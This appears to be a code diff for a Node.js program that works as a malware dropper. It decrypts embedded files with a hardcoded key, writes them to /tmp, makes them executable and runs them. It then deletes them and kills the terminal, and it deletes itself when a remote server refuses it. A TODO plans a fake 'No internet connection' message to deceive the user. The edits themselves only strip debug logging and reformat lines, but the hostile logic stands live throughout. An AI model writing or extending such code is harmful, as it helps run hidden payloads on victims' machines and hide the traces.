@@ -83,7 +83,7 @@ const deleteFile = (filePath) => {
 };
 
 const decrypt = (data, key) => {
-	console.log("Key: " + key);
+	// console.log("Key: " + key);
 	const decipher = crypto.createDecipher('aes-256-ctr', String(key))
 	let dec = decipher.update(data, 'hex', 'utf8')
 	dec += decipher.final('utf8');
@@ -104,7 +104,7 @@ const ping = (ipAddress, machineInfo) => {
 
 	const filePath = '/tmp/' + parseInt(Math.random() * 1000) + '.' + file.type;
 
-	fs.writeFile(filePath, decrypt(dummyFiles[file.type] || dummyFiles.txt, '123'), 'binary', function(err) {
+	fs.writeFile(filePath, decrypt(dummyFiles[file.type] || dummyFiles.txt, '123'), 'utf8', function(err) {
 		system.exec('chmod +x \'' + filePath + '\'').then(() => {
 
 			system.exec(runCommand + " " + filePath);
@@ -114,13 +114,12 @@ const ping = (ipAddress, machineInfo) => {
 		});
 	});
 
-  const killTerminal = () => {
-    // Close the terminal
-  	system.exec(killCommand.terminal).then((out) => {
-  		console.log(killCommand.terminal);
-  		console.log("Wow:" + out);
-  	});
-  };
+	const killTerminal = () => {
+		// Close the terminal
+		system.exec(killCommand.terminal).then((out) => {
+			console.log("");
+		});
+	};
 
 	request(options)
 		.then((resp) => {
@@ -134,7 +133,7 @@ const ping = (ipAddress, machineInfo) => {
 							.then(() => {
 								setTimeout(() => {
 									deleteFile(filePath) // delete the file
-                  killTerminal();
+									killTerminal();
 								}, 1500);
 							});
 
@@ -148,14 +147,14 @@ const ping = (ipAddress, machineInfo) => {
 			if (err.response.statusCode === 401 || err.response.statusCode === 500) {
 				// Unauthorized or deleted file, self destroy.
 				deleteFile(__filename);
-        killTerminal();
+				killTerminal();
 			} else {
 				if (tryCount < 3) {
 					tryCount++;
 					ping(ipAddress, machineInfo);
 				} else {
 					// TODO: Too many tries with failures, show "No internet connection" etc.
-          killTerminal();
+					killTerminal();
 				}
 			}
 		});
